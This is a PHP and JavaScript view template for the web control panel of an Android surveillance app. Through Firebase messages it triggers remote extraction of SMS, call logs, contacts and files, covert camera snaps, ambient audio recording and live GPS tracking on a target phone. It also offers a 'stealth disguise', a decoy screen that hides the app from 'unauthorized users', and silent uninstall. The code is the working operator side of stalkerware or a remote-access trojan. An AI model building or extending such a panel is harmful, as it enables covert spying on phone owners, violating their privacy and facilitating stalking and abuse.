<?php /** @var array|null $targetDevice */ ?>
<div class="content-wrapper">
    <!-- Page Header -->
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2 align-items-center">
                <div class="col-sm-6">
                    <h1><i class="fas fa-mobile-alt text-primary mr-2"></i>Remote Device</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('dashboard') ?>">Home</a></li>
                        <li class="breadcrumb-item active">Remote Device</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">

            <?php if (session()->getFlashdata('error')): ?>
            <div class="alert alert-danger alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('error') ?>
            </div>
            <?php endif; ?>

            <!-- Page Callout -->
            <div class="callout callout-info">
                <h5><i class="fas fa-satellite-dish mr-2"></i>Interactive Control Console</h5>
                <p class="mb-0 text-muted small">
                    Trigger data extraction, device management, and remote synchronization on your registered Android device.
                    Commands are delivered via Firebase Cloud Messaging (FCM) — device must be online to receive them.
                </p>
            </div>

            <!-- Device Status Row -->
            <div class="row mb-3">
                <div class="col-12">
                    <?php if ($targetDevice): ?>
                    <div class="callout callout-success py-2">
                        <div class="d-flex align-items-center flex-wrap">
                            <i class="fas fa-mobile-alt text-success fa-2x mr-3"></i>
                            <div>
                                <strong><?= htmlspecialchars($targetDevice['device_model'] ?? 'Unknown Device') ?></strong>
                                <span class="badge badge-success ml-2">Active</span><br>
                                <small class="text-muted"><?= htmlspecialchars($targetDevice['device_manufacturer'] ?? '') ?> &bull; FCM token on record</small>
                            </div>
                            <?php if (!empty($recentUploadSources)): ?>
                            <div class="ml-auto d-flex align-items-center flex-wrap">
                                <small class="text-muted mr-2"><i class="fas fa-cloud-upload-alt mr-1"></i>Last 7 days:</small>
                                <?php foreach ($recentUploadSources as $src): ?>
                                    <?php $badgeClass = match($src['upload_source']) {
                                        'manual'        => 'badge-primary',
                                        'auto_sync'     => 'badge-secondary',
                                        'web_initiated' => 'badge-success',
                                        default         => 'badge-secondary',
                                    }; ?>
                                    <span class="badge <?= $badgeClass ?> mr-1"><?= str_replace('_', ' ', $src['upload_source']) ?>: <?= $src['count'] ?></span>
                                <?php endforeach; ?>
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                    <script>const activeFcmToken = <?= json_encode($targetDevice['fcm_token'] ?? '') ?>;</script>
                    <?php else: ?>
                    <div class="callout callout-warning py-2">
                        <i class="fas fa-exclamation-circle text-warning mr-2"></i>
                        <strong>No Active Device</strong> &mdash; <span class="text-muted small">No registered device with an active FCM token was found for your account.</span>
                    </div>
                    <script>const activeFcmToken = '';</script>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Main Tabbed Card -->
            <div class="card card-primary card-outline">
                <div class="card-header p-0 pt-1 border-bottom-0">
                    <ul class="nav nav-tabs" id="remoteDeviceTabs" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link active" id="tab-fetch-link" data-toggle="tab" href="#tab-fetch" role="tab">
                                <i class="fas fa-database mr-1"></i> Data Fetch
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" id="tab-mgmt-link" data-toggle="tab" href="#tab-mgmt" role="tab">
                                <i class="fas fa-cogs mr-1"></i> Device Management
                            </a>
                        </li>
                    </ul>
                </div>

                <div class="card-body">
                    <div class="tab-content" id="remoteDeviceTabsContent">

                        <!-- ==================== DATA FETCH TAB ==================== -->
                        <div class="tab-pane fade show active" id="tab-fetch" role="tabpanel">
                            <div class="alert alert-light border-left-primary border mb-4">
                                <i class="fas fa-info-circle text-primary mr-2"></i>
                                Click any command below to send an extraction request to your device.
                            </div>
                            <div class="row text-center" id="command-grid">
                                <?php
                                $commands = [
                                    ['id' => 'sms',           'label' => 'Fetch SMS',      'icon' => 'fas fa-sms',            'color' => '#007bff', 'desc' => 'All SMS messages'],
                                    ['id' => 'calls',         'label' => 'Call Logs',      'icon' => 'fas fa-phone-alt',      'color' => '#28a745', 'desc' => 'Full call history'],
                                    ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fas fa-address-book',   'color' => '#17a2b8', 'desc' => 'Full contact list'],
                                    ['id' => 'search_data',   'label' => 'Keyword Search', 'icon' => 'fas fa-search',         'color' => '#00acc1', 'desc' => 'Search SMS/Call data'],
                                    ['id' => 'capture_photo', 'label' => 'Camera Snap',    'icon' => 'fas fa-camera',         'color' => '#d81b60', 'desc' => 'Remote photo capture'],
                                    ['id' => 'record_audio',  'label' => 'Ambient Audio',  'icon' => 'fas fa-microphone',     'color' => '#ff8f00', 'desc' => 'Record environment audio'],
                                    ['id' => 'files',         'label' => 'File List',      'icon' => 'fas fa-file-alt',       'color' => '#20c997', 'desc' => 'Recent files'],
                                    ['id' => 'fetch_file',    'label' => 'Targeted File',  'icon' => 'fas fa-file-download',  'color' => '#00897b', 'desc' => 'Fetch specific file path'],
                                    ['id' => 'location',      'label' => 'GPS Location',   'icon' => 'fas fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'Precise location & activity'],
                                    ['id' => 'start_tracking','label' => 'Live Tracking',  'icon' => 'fas fa-route',          'color' => '#e53935', 'desc' => 'Real-time GPS tracking'],
                                    ['id' => 'context',       'label' => 'Context',        'icon' => 'fas fa-walking',        'color' => '#e83e8c', 'desc' => 'Motion & device state'],
                                    ['id' => 'apps',          'label' => 'Apps List',      'icon' => 'fas fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed apps'],
                                    ['id' => 'usage',         'label' => 'App Usage',      'icon' => 'fas fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen-time stats'],
                                    ['id' => 'notifications', 'label' => 'Notifications',  'icon' => 'fas fa-bell',           'color' => '#ffc107', 'desc' => 'Status bar alerts'],
                                    ['id' => 'device_info',   'label' => 'Device Info',    'icon' => 'fas fa-info-circle',    'color' => '#6c757d', 'desc' => 'Hardware & build info'],
                                    ['id' => 'misc_hardware', 'label' => 'Misc Hardware',  'icon' => 'fas fa-microchip',      'color' => '#117a8b', 'desc' => 'Sensors, network, Bluetooth'],
                                    ['id' => 'misc_software', 'label' => 'Misc Software',  'icon' => 'fas fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
                                    ['id' => 'beep',          'label' => 'Test Beep',      'icon' => 'fas fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play a beep sound'],
                                    ['id' => 'all',           'label' => 'Sync All',       'icon' => 'fas fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Full data extraction'],
                                ];
                                foreach ($commands as $cmd):
                                ?>
                                <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-3">
                                    <button class="btn btn-block btn-remote-cmd p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
                                            data-cmd="<?= $cmd['id'] ?>"
                                            style="border-radius: 10px; transition: all 0.25s ease; background: #fff; cursor:pointer;">
                                        <div class="cmd-icon-wrapper mb-2" style="color: <?= $cmd['color'] ?>; font-size: 1.9rem; width:52px; height:52px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.03); border-radius:50%;">
                                            <i class="<?= $cmd['icon'] ?>"></i>
                                        </div>
                                        <span class="font-weight-bold text-dark mb-1" style="font-size:13px;"><?= $cmd['label'] ?></span>
                                        <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $cmd['desc'] ?></small>
                                    </button>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>

                        <!-- ==================== DEVICE MANAGEMENT TAB ==================== -->
                        <div class="tab-pane fade" id="tab-mgmt" role="tabpanel">
                            <div class="alert alert-warning alert-dismissible">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                <strong>Caution:</strong> These commands make permanent changes to the Android device. Confirm each action carefully before executing.
                            </div>
                            <div class="row" id="mgmt-grid">

                                <!-- Reset App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-warning h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                            <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                            <p class="text-muted small mb-4">Restore default icon, clear stealth disguise, and reset launch codes to factory defaults.</p>
                                            <button class="btn btn-warning btn-block font-weight-bold btn-mgmt-cmd" data-cmd="reset_app">
                                                <i class="fas fa-undo mr-1"></i> Reset App
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Deactivate App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-secondary h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                            <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                            <p class="text-muted small mb-4">Replace the active UI with a static dummy screen. Unauthorized users see nothing suspicious.</p>
                                            <button class="btn btn-secondary btn-block font-weight-bold btn-mgmt-cmd" data-cmd="deactivate">
                                                <i class="fas fa-eye-slash mr-1"></i> Deactivate
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Logout User -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-info h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                            <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                            <p class="text-muted small mb-4">Clears auth token on device and stops background sync. Returns the user to the login screen.</p>
                                            <button class="btn btn-info btn-block font-weight-bold btn-mgmt-cmd" data-cmd="logout">
                                                <i class="fas fa-sign-out-alt mr-1"></i> Logout
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Keep Data -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-danger h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                            <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                            <p class="text-muted small mb-4">Backs up app data then uninstalls. Reinstalling the app will restore configuration automatically.</p>
                                            <button class="btn btn-danger btn-block font-weight-bold btn-mgmt-cmd" data-cmd="uninstall_preserve">
                                                <i class="fas fa-archive mr-1"></i> Uninstall &amp; Preserve
                                            </button>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Wipe All -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-dark h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                            <h5 class="card-title font-weight-bold">Uninstall (Wipe All)</h5>
                                            <p class="text-muted small mb-4">Completely removes the app and all local data. Device admin may enable silent removal. Cannot be undone.</p>
                                            <button class="btn btn-dark btn-block font-weight-bold btn-mgmt-cmd" data-cmd="uninstall_wipe">
                                                <i class="fas fa-trash-alt mr-1"></i> Uninstall &amp; Wipe
                                            </button>
                                        </div>
                                    </div>
                                </div>

                            </div><!-- /.row#mgmt-grid -->
                        </div><!-- /.tab-pane#tab-mgmt -->

                    </div><!-- /.tab-content -->
                </div><!-- /.card-body -->

                <div class="card-footer bg-light">
                    <div class="d-flex align-items-center flex-wrap">
                        <i class="fas fa-info-circle text-muted mr-2"></i>
                        <small class="text-muted">Commands are sent via Google Firebase Cloud Messaging (FCM). The device must be online. Some actions require Device Admin privileges.</small>
                        <span class="badge badge-info ml-auto" id="status-display" style="display:none;">Ready</span>
                    </div>
                </div>

            </div><!-- /.card -->

        </div><!-- /.container-fluid -->
    </section>
</div><!-- /.content-wrapper -->

<style>
.btn-remote-cmd:hover {
    transform: translateY(-4px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.12) !important;
    border-color: #007bff !important;
}
.btn-remote-cmd:active { transform: translateY(-1px); }
.btn-remote-cmd.loading { opacity: 0.65; pointer-events: none; }
.btn-mgmt-cmd.loading  { opacity: 0.65; pointer-events: none; }
.cmd-icon-wrapper { transition: background 0.25s; }
.btn-remote-cmd:hover .cmd-icon-wrapper { background: rgba(0,123,255,0.07) !important; }
@keyframes spin { 100% { transform: rotate(360deg); } }
.btn-remote-cmd.loading .cmd-icon-wrapper i { animation: spin 0.8s linear infinite; }
</style>

<!-- Toastr -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

<script>
$(function() {

    // ========================
    // DATA FETCH COMMANDS
    // ========================
    $('.btn-remote-cmd').on('click', function() {
        const $btn = $(this);
        const cmd  = $btn.data('cmd');
        const $iconEl = $btn.find('.cmd-icon-wrapper i');
        const origIconClass = $iconEl.attr('class');

        const executeCommand = (extraData = {}) => {
            if ($btn.hasClass('loading')) return;
            $btn.addClass('loading').prop('disabled', true);
            $iconEl.attr('class', 'fas fa-spinner');
            $('#status-display').fadeIn().removeClass('badge-danger badge-success').addClass('badge-info').text('Sending ' + cmd + '…');

            const resetBtn = () => {
                $btn.removeClass('loading').prop('disabled', false);
                $iconEl.attr('class', origIconClass);
                setTimeout(() => $('#status-display').fadeOut(), 5000);
            };

            $.ajax({
                url: `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}`,
                method: 'POST',
                data: extraData,
                dataType: 'json',
                timeout: 120000,
                success(response) {
                    resetBtn();
                    if (response && response.success) {
                        toastr.success('Command sent successfully.');
                        $('#status-display').removeClass('badge-info').addClass('badge-success').text('Sent: ' + cmd);
                    } else {
                        toastr.error((response && response.message) ? response.message : 'Failed to send command');
                        $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Error: ' + cmd);
                    }
                },
                error(xhr, status) {
                    resetBtn();
                    let msg = 'Network error. Please try again.';
                    if (status === 'timeout') msg = 'Request timed out — device may be offline.';
                    else if (xhr.responseJSON && xhr.responseJSON.message) msg = xhr.responseJSON.message;
                    toastr.error(msg);
                    $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Failed');
                }
            });
        };

        if (!activeFcmToken) { toastr.error('No active device with FCM token found.'); return; }

        if (cmd === 'fetch_file') {
            Swal.fire({ title:'Targeted File Fetch', text:'Enter the exact file path (e.g., /sdcard/Download/doc.pdf):', input:'text',
                showCancelButton:true, confirmButtonText:'Fetch File',
                inputValidator: v => { if (!v) return 'File path is required!'; }
            }).then(r => { if (r.isConfirmed && r.value) executeCommand({ file_path: r.value }); });
        } else if (cmd === 'search_data') {
            Swal.fire({ title:'Keyword Search', text:'Enter keyword to search in SMS/Calls:', input:'text',
                showCancelButton:true, confirmButtonText:'Search',
                inputValidator: v => { if (!v) return 'Keyword is required!'; }
            }).then(r => { if (r.isConfirmed && r.value) executeCommand({ keyword: r.value }); });
        } else if (cmd === 'start_tracking') {
            Swal.fire({ title:'Live Tracking', text:'Duration in minutes:', input:'number',
                inputAttributes:{ min:1, max:1440 }, inputValue:60,
                showCancelButton:true, confirmButtonText:'Start Tracking'
            }).then(r => { if (r.isConfirmed && r.value) executeCommand({ duration_minutes: r.value }); });
        } else {
            executeCommand();
        }
    });

    // ========================
    // DEVICE MANAGEMENT COMMANDS
    // ========================
    $('.btn-mgmt-cmd').on('click', function() {
        const $btn = $(this);
        const cmd  = $btn.data('cmd');

        if (!activeFcmToken) { toastr.error('No active device with FCM token found.'); return; }

        const titles = {
            reset_app:          'Reset Android App?',
            deactivate:         'Deactivate Android App?',
            logout:             'Force Logout on Device?',
            uninstall_preserve: 'Uninstall (Keep Data)?',
            uninstall_wipe:     'Uninstall & Wipe All Data?',
        };
        const texts = {
            reset_app:          'Restores default icon, disables stealth disguise, resets launch codes to defaults.',
            deactivate:         'Replaces the active UI with a static dummy screen. The app appears as a harmless device info page.',
            logout:             'Clears the auth token on the device. Background sync stops and the user returns to the login screen.',
            uninstall_preserve: 'Backs up all app data before uninstalling. Reinstalling will restore your configuration. Continue?',
            uninstall_wipe:     'Permanently removes the app and ALL local data. This CANNOT be undone. Continue?',
        };
        const icons  = { reset_app:'warning', deactivate:'question', logout:'info', uninstall_preserve:'warning', uninstall_wipe:'error' };
        const colors = { reset_app:'#ffc107', deactivate:'#6c757d', logout:'#17a2b8', uninstall_preserve:'#dc3545', uninstall_wipe:'#343a40' };
        const payloads = { reset_app:'reset', deactivate:'deactivate', logout:'logout', uninstall_preserve:'uninstall_preserve', uninstall_wipe:'uninstall_wipe' };

        Swal.fire({
            title: titles[cmd] || 'Execute Command?',
            text:  texts[cmd]  || 'Are you sure?',
            icon:  icons[cmd]  || 'warning',
            showCancelButton: true,
            confirmButtonColor: colors[cmd] || '#dc3545',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Yes, Execute',
            cancelButtonText:  'Cancel'
        }).then(result => {
            if (!result.isConfirmed) return;
            const origHtml = $btn.html();
            $btn.addClass('loading').prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending…');
            $.ajax({
                url: `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}/${payloads[cmd] || cmd}`,
                method: 'POST',
                dataType: 'json',
                timeout: 120000,
                success(r) {
                    $btn.removeClass('loading').prop('disabled', false).html(origHtml);
                    if (r && r.success) {
                        Swal.fire({ icon:'success', title:'Command Sent', text:'The device will process the command shortly.', timer:3000, showConfirmButton:false });
                    } else {
                        toastr.error((r && r.message) ? r.message : 'Failed to send command');
                    }
                },
                error(xhr) {
                    $btn.removeClass('loading').prop('disabled', false).html(origHtml);
                    let msg = 'Network error — device may be offline.';
                    if (xhr.responseJSON && xhr.responseJSON.message) msg = xhr.responseJSON.message;
                    toastr.error(msg);
                }
            });
        });
    });
});
</script>
<?php include __DIR__ . '/_adv_style.php'; ?>
